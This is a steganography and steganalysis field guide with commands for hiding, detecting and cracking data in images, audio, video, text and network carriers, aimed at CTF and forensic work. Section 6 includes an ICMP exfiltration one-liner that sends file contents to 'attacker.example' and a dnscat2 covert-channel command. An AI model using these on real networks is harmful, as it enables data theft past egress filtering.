# Steganography Field Guide

A practical reference for hiding data (steganography) and finding it (steganalysis) across images, audio, video, text, and network carriers — with working commands for each tool. Companion piece to the CSI Linux + Forensics guide.

---

## 1. Steganography vs Cryptography

| | Cryptography | Steganography |
|---|---|---|
| Goal | Make data **unreadable** | Make data **invisible** |
| Output | Looks like random gibberish (suspicious) | Looks like an innocent file |
| Detectability | Detection is easy, breaking is hard | Detection is the hard part |
| Best use | Data at rest / in transit | Covert channel, hiding in plain sight |
| Combined | Cryptography first, then stego → **double protection** |

**Rule of thumb:** `stego(crypto(payload))` — encrypt the payload, then hide it. A hidden encrypted blob that gets detected is still unreadable; a hidden plaintext that gets detected is game over.

### Core concepts
- **Carrier (cover)** — the innocent file you hide in (JPEG, PNG, WAV, MP3, video, text)
- **Payload** — the secret data
- **Stego-object (stego)** — the carrier after embedding
- **Passphrase/Key** — optional secret controlling the embedding pattern (without it, extraction is harder)
- **Capacity** — how much payload the carrier can hold (LSB PNG: ~12.5% of file size; JPEG: much less)
- **Detectability vs Robustness** — more payload = more detectable; more robust (spread out) = harder to extract if the file is recompressed/edited

---

## 2. Image Steganography

### Methods
| Method | Carriers | How it works | Detectability |
|---|---|---|---|
| **LSB substitution** | PNG, BMP (lossless) | Replace least-significant bits of pixel channels with payload bits | Low — but noisy bit-planes are statistically detectable |
| **DCT coefficient modulation** | JPEG (lossy) | Alter quantized DCT coefficients (JSteg, F5, OutGuess, Steghide) | Medium — changes histogram statistics |
| **Palette manipulation** | GIF | Swap similar palette colors | Medium |
| **Appending after EOI** | JPEG, PNG | Append data after the end-of-image marker (`FF D9` / `IEND`) | Very low — most viewers ignore it; file size grows |
| **Metadata fields** | All | EXIF comments, XPComment, copyright fields | Low (size change visible) |
| **Embedded archives** | Any | Zip/rar hidden inside image structure | Low — binwalk finds it instantly |

### Image tools

| Tool | What it does | Key command(s) |
|---|---|---|
| `steghide` | Hide/extract in JPEG/BMP/WAV/AU (AES-encrypted, passphrase-protected) | see below |
| `outguess` | Classic JPEG stego (randomizes unused DCT coefficients) | `outguess -k "pass" -d secret.txt cover.jpg stego.jpg` / `outguess -k "pass" -r stego.jpg secret.txt` |
| `zsteg` | Auto-detect LSB/bit-plane stego in PNG/BMP (+ metadata) | `zsteg -a image.png` |
| `stegsolve` | GUI: bit-plane viewer, LSB extractor, frame browser | `stegsolve` |
| `stegdetect` | Statistically detect JSteg/OutGuess/JPHide/F5 | `stegdetect -s 10.0 stego.jpg` |
| `openstego` | GUI: LSB + WavSteg (Cross-platform Java) | `openstego` |
| `silenteye` | GUI: LSB image + audio stego | `silenteye` |
| `steghide` brute-force | Crack passphrases | see section 7 |
| `stegcracker` | Wordlist attack against steghide | `stegcracker stego.jpg rockyou.txt` |
| `stegseek` | Very fast steghide cracker (precomputed) | `stegseek stego.jpg rockyou.txt` |
| `pngcheck` | Validate PNG structure, find anomalies | `pngcheck -v image.png` |
| `binwalk` | Find embedded files/archives | `binwalk -e image.jpg` |
| `foremost` | Carve hidden files out by signature | `foremost -i image.jpg -o out/` |
| `exiftool` | Read metadata stashes | `exiftool -a image.jpg` |
| `strings` | Dump plaintext remnants | `strings -n 8 image.jpg` |
| `steghide` info | Check if file is a steghide carrier | `steghide info stego.jpg` |

```bash
# Steghide — the JPEG/BMP/WAV workhorse
steghide embed -cf cover.jpg -ef secret.txt -p passphrase    # hide
steghide extract -sf stego.jpg -p passphrase                 # extract
steghide info stego.jpg                                      # test if it's a carrier
steghide embed -cf cover.jpg -ef secret.txt -p ""            # empty passphrase (common in CTFs)

# Zsteg — first-pass LSB detection on PNG/BMP
zsteg -a image.png                     # all known techniques
zsteg -E "b1,rgb,lsb,xy" image.png     # explicit plane: bit 1, RGB, LSB, xy order

# Outguess
outguess -k secretkey -d payload.txt cover.jpg stego.jpg
outguess -k secretkey -r stego.jpg extracted.txt

# Stegdetect — JPEG statistical detection (note: doesn't detect steghide/outguess-with-key reliably)
stegdetect -s 10.0 -t jsteg,outguess,jphide,f5 suspect.jpg
```

> **PNG/BMP = LSB-friendly (lossless), JPEG = DCT-friendly (lossy).** Steghide works on JPEG; zsteg/stegsolve on PNG/BMP. Trying steghide on a PNG is the #1 beginner mistake.

---

## 3. Audio Steganography

### Methods
| Method | Carriers | How it works |
|---|---|---|
| LSB substitution | WAV (lossless PCM) | Same concept as images — replace low bits of samples |
| **MP3 bit-rate encoding** | MP3 | MP3Stego alters compressed frame bit-rates |
| Phase coding | WAV | Replace phase of audio segments |
| Echo hiding | WAV/MP3 | Encode bits via echo delay/amplitude |
| Spread spectrum | WAV | Payload spread across the spectrum (robust, low capacity) |
| **Spectrogram hiding** | Any | Draw the payload *as an image* inside the audio spectrum (SSTV / waterfall) — visible when you look at the spectrum |

### Audio tools

| Tool | What it does | Key command(s) |
|---|---|---|
| `mp3stego` | Hide/extract in MP3 bit-rates | `mp3stego -e -p pass in.wav out.mp3` / `mp3stego -d -p pass in.mp3` |
| `wavsteg` | LSB in WAV | `wavsteg -h -i cover.wav -s secret.txt -o stego.wav -a 1` / `wavsteg -x -i stego.wav -o out.txt -a 1` |
| `hideme` (Win) | GUI: WAV/MP3/AAC stego | GUI |
| `DeepSound` (Win) | Hides files in audio (incl. cover files) | GUI |
| `audacity` | Spectrogram view + audio analysis | `audacity stego.wav` → View > Spectrogram |
| `sonic-visualiser` | Advanced spectrum analysis | `sonic-visualiser stego.wav` |
| `ffmpeg` | Convert/extract audio streams | `ffmpeg -i video.mp4 audio.wav` |
| `Sonic Visualizer` / `RX` | Find "images" hidden in the spectrum | spectrogram inspection |
| `steghide` | Also works on WAV/AU | see image section |

```bash
# WavSteg — LSB in WAV
wavsteg -h -i cover.wav -s secret.txt -o stego.wav -a 1      # embed (alpha 1 = LSB)
wavsteg -x -i stego.wav -o extracted.txt -a 1                # extract

# MP3Stego (Java)
java -jar mp3stego.jar e -p passphrase cover.wav stego.mp3    # encode
java -jar mp3stego.jar d -p passphrase stego.mp3              # decode

# Spectrogram check — the "hidden image" classic
ffmpeg -i mystery.wav -lavfi showspectrumpic=s=800x400:s1=1 spectrum.png
audacity mystery.wav   # then View ▸ Spectrogram (SPECTRAL VIEW)
```

> **Always check the spectrogram.** A surprisingly large number of CTF/IR cases hide flags, QR codes, or messages as visible images inside audio spectra. In Audacity: toggle `View → Spectrogram`, pick a wide window size (e.g. 2048–8192) for resolution.

---

## 4. Video Steganography

| Tool | What it does | Key command(s) |
|---|---|---|
| `ffmpeg` | Extract every frame as images for analysis | `ffmpeg -i video.mp4 -vsync 0 frames/f_%04d.png` |
| `openstego` | Video/image LSB stego | GUI |
| `steghide`-style per-frame | Extract frame → treat each frame as image carrier | combine with zsteg/stegsolve |
| `hideovideo` / `UniSpy` | Video carriers | GUI |
| `exiftool` | Check video metadata/comments | `exiftool -a video.mp4` |

```bash
# Frame-by-frame analysis workflow
mkdir frames && ffmpeg -i video.mp4 -vsync 0 frames/f_%04d.png
for f in frames/*.png; do zsteg -a "$f"; done 2>/dev/null | grep -v "^$" | head   # look for LSB hits
# Also check: audio track (ffmpeg -i video.mp4 audio.wav), subtitles, and appended data (binwalk)
```

---

## 5. Text & Document Steganography

| Method | How it works | Detection |
|---|---|---|
| **Whitespace** | Trailing spaces/tabs encode bits (`stegsnow`) | Hexdump: `20 20 09 20` patterns |
| **Zero-width characters** | ZWJ (U+200D), ZWNJ (U+200C), ZWSP (U+200B) encode bits | Copy/paste into a hex viewer or use `u-steg`/online tools |
| **Homoglyphs** | Replace letters with lookalike Unicode chars | `iconv -f UTF-8 -t ASCII//TRANSLIT` changes them |
| **Acrostic** | First letter of each line/sentence | Read the text |
| **Font/color tricks (docs)** | White text on white bg, tiny font, hidden slides | Change background color, select-all |
| **Document metadata** | docx/xlsx core.xml, comments | `exiftool file.docx` / unzip and inspect |
| **Synthetic text** | Markov-generated cover text | Statistical analysis of word frequencies |

| Tool | What it does | Key command(s) |
|---|---|---|
| `stegsnow` | Whitespace stego in text files | `stegsnow -C -p pass -m "secret" cover.txt stego.txt` / `stegsnow -C -p pass stego.txt` |
| `cat -A` / `xxd` | Reveal whitespace/control chars | `cat -A file.txt` / `xxd file.txt` |
| `iconv` | Detect/replace homoglyphs | `iconv -f UTF-8 -t ASCII//TRANSLIT file.txt` |
| `unzip` | Inspect docx/xlsx (they're ZIPs) | `unzip -l doc.docx` / `unzip -p doc.docx word/document.xml` |
| `exiftool` | docx/pdf metadata | `exiftool -a doc.docx` |
| `pdftotext` + inspect | PDF hidden text layers | `pdftotext file.pdf -` |
| `strings` | PDF/office embedded leftovers | `strings -n 8 file.pdf` |
| `qpdf` | Decompress/linearize PDFs for manual inspection | `qpdf --qdf --object-streams=disable in.pdf out.qdf` |

```bash
# stegsnow — whitespace stego
stegsnow -C -p mypass -m "TOP SECRET" cover.txt stego.txt   # hide
stegsnow -C -p mypass stego.txt                             # extract

# Spot zero-width characters (invisible in editors)
xxd file.txt | grep -E "200b|200c|200d|feff"                 # ZWSP / ZWNJ / ZWJ / BOM

# Inspect a docx (zip) for hidden content
unzip -l document.docx
unzip -p document.docx word/document.xml | grep -o 'w:color w:val="FFFFFF"' | head
```

---

## 6. Network & File-System Steganography (Covert Channels)

| Carrier | How it works | Tools |
|---|---|---|
| **TCP/IP headers** | Set unused header bits / ISNs / TTL values to carry data | `hidel`, `pcapSteg`, custom Scapy |
| **DNS queries** | Encode data in subdomain labels (classic C2 exfil) | `dnscat2`, `iodine` |
| **ICMP echo payloads** | Data in ping payloads | `ptunnel`, custom Scapy |
| **NTFS ADS** | Alternate Data Streams — `file.txt:hidden.txt` | `echo secret > file.txt:hidden.txt` |
| **Slack space** | Unused space between file clusters | `bmap`/custom |
| **TCP timestamps** | Encode bits in timestamp fields | custom |
| **HTTP headers/order** | Custom headers or header-order encoding | custom |

```bash
# NTFS ADS — Windows hidden stream
echo "secret data" > report.pdf:notes.txt
dir /r report.pdf                    # list ADS
notepad report.pdf:notes.txt         # read it

# Detect ADS on Linux-mounted NTFS (or with 7z/sleuthkit)
# DNS covert channel (both directions)
dnscat2  # server
./dnscat2-client 10.0.0.5            # client — data rides in DNS queries

# ICMP payload exfil (one-shot)
xxd -p secret.txt | while read h; do ping -c1 -p "$h" attacker.example; done
```

> **Covert channels are the bridge between stego and malware/C2.** Attackers hide data in DNS queries and TCP options to bypass egress filtering; DFIR analysts look for anomalous DNS label lengths, TTL anomalies, and non-standard packet payloads (see the network forensics section of the main guide).

---

## 7. Cracking Stego Passphrases (Steganalysis by Brute Force)

| Tool | What it does | Key command(s) |
|---|---|---|
| `stegseek` | Cracks steghide at ~millions of passphrases/sec (precomputed RS table) | `stegseek stego.jpg rockyou.txt` |
| `stegcracker` | Python wordlist attack against steghide | `stegcracker stego.jpg wordlist.txt` |
| `hashcat` (mode 16511) | JWT/other — not for steghide; use stegseek instead | — |
| `john` + `steghide2john` | Feed steghide-embedded carriers into John | see below |

```bash
# StegSeek — the fast way (also auto-extracts when it finds the key)
stegseek stego.jpg /usr/share/wordlists/rockyou.txt
stegseek stego.jpg wordlist.txt --extract             # auto-extract on success

# StegCracker — slower but available anywhere
stegcracker stego.jpg /usr/share/wordlists/rockyou.txt

# John the Ripper route (steghide2john is in John's run/ dir)
steghide2john stego.jpg > carrier.hash
john --wordlist=/usr/share/wordlists/rockyou.txt carrier.hash
```

**Stegseek speed tip:** it precomputes the steghide RS table, so it's often 100–1000× faster than stegcracker. Always try StegSeek first.

---

## 8. Steganalysis — Detection & Forensics

### Detection ladder (from cheap to expensive)
1. **Suspicion:** file size anomalies (JPEG with huge file size), odd modification times, a file that "doesn't fit" the folder.
2. **Signatures:** `strings`, `binwalk`, `foremost`, `exiftool` — appended data, embedded archives, metadata stashes.
3. **Structural:** `pngcheck`, `xxd` for `FF D9` (JPEG EOI) followed by data; palette anomalies in GIF.
4. **Visual:** stegsolve bit-plane inspection (LSB noise = stego), ELA (JPEG tampering), spectrogram (audio).
5. **Statistical:** stegdetect (JSteg/OutGuess/JPHide/F5), chi-square attack, histogram analysis.
6. **Comparative:** original vs suspect carrier — diff the bytes (`cmp -l`), compare hash + size; any change beyond expected recompression is suspicious.
7. **Fingerprinting:** PRNU/sensor noise matching to prove an image came from a specific camera (see photo forensics in the main guide).

### Detection tools

| Tool | What it does | Key command(s) |
|---|---|---|
| `strings` | Plaintext payload remnants | `strings -n 8 suspect.jpg` |
| `binwalk` | Embedded archives/files | `binwalk suspect.jpg` |
| `foremost` | Carve anything embedded | `foremost -i suspect.jpg -o out/` |
| `exiftool` | Metadata / comment fields | `exiftool -a -G1 suspect.jpg` |
| `pngcheck` | PNG structural anomalies | `pngcheck -v suspect.png` |
| `xxd` | Manual byte inspection | `xxd suspect.jpg \| tail -5` (look for data after `ffd9`) |
| `stegdetect` | JSteg/OutGuess/JPHide/F5 stats | `stegdetect -s 10.0 suspect.jpg` |
| `zsteg` | LSB/bit-plane detection | `zsteg -a suspect.png` |
| `stegsolve` | Manual bit-plane walking | `stegsolve` |
| `steghide info` | Is it a steghide carrier? | `steghide info suspect.jpg` |
| `cmp` / `diff` | Compare original vs suspect | `cmp -l original.jpg suspect.jpg` |
| `audacity` | Audio spectrum inspection | `audacity suspect.wav` |
| `fcrackzip` / `zip2john` | Password-protected embedded zips | `zip2john found.zip \| john --wordlist=rockyou.txt -` |

```bash
# 1. Size + hash anomaly check
ls -la suspect.jpg; sha256sum original.jpg suspect.jpg

# 2. Appended-data check (JPEG should end with FF D9)
xxd suspect.jpg | tail -3
# if you see text after ff d9 → appended payload; try: dd if=suspect.jpg bs=1 skip=$(grep -abo $'\xff\xd9' suspect.jpg | head -1 | cut -d: -f1) 2>/dev/null | strings

# 3. Metadata
exiftool -a -G1 suspect.jpg

# 4. Embedded files
binwalk suspect.jpg && foremost -i suspect.jpg -o carved/

# 5. Statistical JPEG scan
stegdetect -s 10.0 -t jsteg,outguess,jphide,f5 suspect.jpg

# 6. PNG bit-plane analysis
zsteg -a suspect.png

# 7. Audio spectrum
audacity suspect.wav   # View → Spectrogram
```

### Image steganalysis with Python (Pillow) — LSB plane extraction

```python
#!/usr/bin/env python3
# lsb_analyze.py — dump each bit-plane of a PNG to reveal LSB stego
import sys
from PIL import Image

img = Image.open(sys.argv[1]).convert("RGB")
w, h = img.size
pix = img.load()

for plane in range(8):                      # 8 bit-planes per channel
    out = Image.new("L", (w, h))
    op = out.load()
    for y in range(h):
        for x in range(w):
            r, g, b = pix[x, y]
            bit = (r >> plane) & 1
            op[x, y] = 255 if bit else 0
    out.save(f"plane_{plane}.png")
print("Saved plane_0..7.png — inspect plane_0 for LSB noise patterns")
```

```bash
python3 lsb_analyze.py suspect.png
# If plane_0.png looks like random static (not natural image noise) → LSB stego
```

---

## 9. Full CTF / Investigation Workflow (The "Stego Playbook")

Order matters — cheap tests first, brute force last:

```bash
# STEP 0 — recon the file
file mystery.bin
exiftool -a mystery.bin
strings -n 8 mystery.bin | head -50

# STEP 1 — embedded data / archives
binwalk mystery.bin
foremost -i mystery.bin -o carved/

# STEP 2 — image stego
zsteg -a mystery.png                 # PNG/BMP
steghide info mystery.jpg            # JPEG/BMP/WAV
outguess -r mystery.jpg out.txt      # JPEG
stegdetect -s 10.0 mystery.jpg       # JPEG stats

# STEP 3 — visual/plane inspection
stegsolve mystery.png                # walk bit-planes, check "Gray bits" + "Random colour map"

# STEP 4 — audio spectrum (if audio)
ffmpeg -i mystery.wav -lavfi showspectrumpic=s=800x400:s1=1 spec.png
audacity mystery.wav

# STEP 5 — brute force passphrases (steghide carriers)
stegseek mystery.jpg /usr/share/wordlists/rockyou.txt

# STEP 6 — if the payload is encrypted → identify + crack
hashid 'ciphertext'
# …or feed extracted ciphertext into CyberChef "Magic" for auto-decoding
```

---

## 10. Steganography in the Wild (Malware & C2)

| Campaign / technique | What it did |
|---|---|
| **Drovorub** (Fancy Bear, Linux) | Modules embedded in JPG/PNG images, extracted at runtime, C2 via kernel rootkit |
| **Stego C2 (generic)** | PowerShell/macro loaders pull payloads from pixels of a remote image |
| **DNS tunneling** | Long random-looking subdomains carrying exfiltrated data (`iodine`, `dnscat2`) |
| **Image-based payloads in phishing** | Malicious macro decodes bits from a logo image to build the dropper |
| **Stegosploit** | JPEG stego delivering browser exploits via `data:` URIs |
| **Fileless/ADS** | Payloads in NTFS Alternate Data Streams to evade AV scanning |

**DFIR takeaway:** when a binary downloads an image and reads pixels, or when DNS queries are unusually long — think stego, not just "malicious download."

---

## 11. Anti-Detection & Limitations (know the trade-offs)

- **Every embedding modifies the carrier.** LSB noise, DCT histogram shifts, file-size growth, and metadata timestamps are all forensic signals.
- **Lossy recompression destroys LSB stego.** JPEG/MP3 re-encode = payload gone. That's why steghide uses DCT-domain embedding instead.
- **Capacity vs detectability:** hiding 10 MB in a 100 KB JPEG is detectable by file size alone. Keep payloads < ~5% of carrier for LSB, < ~10% for JPEG DCT.
- **Stego-passphrase brute force is only viable with weak passphrases.** Strong passphrase + strong crypto = effectively unbreakable; detection is then the only (hard) path.
- **Digital watermarking** (PRNU, invisible watermarks) is the legitimate commercial cousin — designed to survive tampering, unlike covert stego.

---

## 12. Practice Resources

1. **Aperi'Solve** (aperisolve.com) — one-stop online stego analysis (zsteg + binwalk + strings + visual planes).
2. **StegOnline** (stegonline.georgeom.net) — browser-based bit-plane/LSB tools, no install.
3. **CyberChef** — "Magic" mode auto-detects encoding/XOR/compression of extracted payloads.
4. **CTF practice:** TryHackMe "Steganography" rooms, Hack The Box forensics boxes, picoCTF forensics challenges, and the classic `canyouhackit` / `hacktoday` stego sets.
5. **Build your own corpus:** hide files with steghide/zsteg/wavsteg/mp3stego/stegsnow and practice detecting your own work — the fastest way to learn the statistical signatures.
6. **Aletheia** (GitHub, open-source) — modern steganalysis framework (LSB, DCT, and image fingerprinting in one tool).

---

*Author's note: This guide is dual-use — know how to hide to know how to hunt. All techniques assume authorized testing (CTF labs, your own data, sanctioned assessments). Detection and forensic recovery are the DFIR-relevant half of this discipline.*
